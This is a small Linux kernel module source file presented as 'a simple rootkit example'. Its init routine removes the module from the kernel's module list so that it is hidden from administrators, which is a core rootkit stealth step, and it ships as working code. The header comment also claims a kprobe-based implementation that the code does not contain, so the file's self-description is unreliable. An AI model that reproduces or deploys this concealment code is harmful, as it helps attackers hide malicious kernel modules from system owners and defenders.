/* This program is a simple rootkit example implemented via kprobe
 * mechanism which provided by kernel itself
 *
 * monkey-coder: Shawn the R0ck@copyleft, <citypw@gmail.com>
 *  
 * This code is also GPL'ed!
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h> 
#include <asm/page.h> 
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

/* Because I only tested this shit on Slackware with kernel 2.6.39 */
#if( LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 37))
#error "Please use higher kernel version, dude!"
#endif

static int init(void) {
	 
	    list_del_init(&__this_module.list);
	     
	        return 0;
}
 
static void exit(void) {
	 
	    return;
}
 
module_init(init);
module_exit(exit);
